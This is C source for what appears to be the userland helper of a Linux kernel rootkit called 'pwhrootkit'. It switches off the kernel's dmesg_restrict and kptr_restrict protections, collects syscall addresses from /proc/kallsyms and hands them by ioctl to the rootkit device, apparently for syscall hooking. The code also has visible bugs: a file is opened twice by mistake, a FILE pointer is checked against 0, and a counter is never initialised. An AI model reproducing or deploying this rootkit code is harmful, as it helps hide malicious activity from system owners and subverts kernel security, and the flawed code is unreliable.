#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEVICE_PATH "/dev/pwhrootkit"
#define USER_KALLSYMS 0x1111

int main(int argc, char **argv, char ** envp){

    FILE *kallsyms_file, *dmesg_restrict_file, *kptr_restrict_file;
    int dev_fd;
    int orig_dmesg_restrict, orig_kptr_restrict;
    char dmesg_recover_cmd[0x100];
    char kptr_recover_cmd[0x100];

    struct {
        size_t kaddr;
        char type;
        char name[0x100];
    } kinfo;
    /* a3师傅找4个我就找5个 :) */
    size_t kern_seek_data[5];
    int syscall_count;

    dmesg_restrict_file = fopen("/proc/sys/kernel/dmesg_restrict", "r");
    if(dmesg_restrict_file < 0){
        perror("fopen");
        return 1;
    }
    kptr_restrict_file = fopen("/proc/sys/kernel/dmesg_restrict", "r");
    if(kptr_restrict_file < 0){
        perror("fopen");
        return 1;
    }
    /* 保存原始值 */
    fscanf(dmesg_restrict_file, "%d", &orig_dmesg_restrict);
    fscanf(kptr_restrict_file, "%d", &orig_kptr_restrict);

    /* 这个代码将被内核调用，因此可以使用root权限 */
    system("echo 0 > /proc/sys/kernel/dmesg_restrict");
    system("echo 0 > /proc/sys/kernel/kptr_restrict");

    kallsyms_file = fopen("/proc/kallsyms", "r");
    if(kallsyms_file < 0){
        perror("fopen");
        return 1;
    }
    while(syscall_count != 5){
        fscanf(kallsyms_file, "%lx %c %100s", &kinfo.kaddr, &kinfo.type, kinfo.name);
        if(!strcmp(kinfo.name, "__x64_sys_read")){
            kern_seek_data[0] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_write")){
            kern_seek_data[1] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_open")){
            kern_seek_data[2] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_close")){
            kern_seek_data[3] = kinfo.kaddr;
            syscall_count++;
        }else if(!strcmp(kinfo.name, "__x64_sys_newstat")){
            kern_seek_data[4] = kinfo.kaddr;
            syscall_count++;
        }
    }

    dev_fd = open(DEVICE_PATH, O_RDWR);
    printf("/dev/pwhrootkit fd: %d\n", dev_fd);

    ioctl(dev_fd, USER_KALLSYMS, kern_seek_data);

    snprintf(dmesg_recover_cmd, 0x100, "echo %d > /proc/sys/kernel/dmesg_restrict", orig_dmesg_restrict);
    snprintf(kptr_recover_cmd, 0x100, "echo %d > /proc/sys/kernel/kptr_restrict", orig_kptr_restrict);

    system(dmesg_recover_cmd);
    system(kptr_recover_cmd);

}


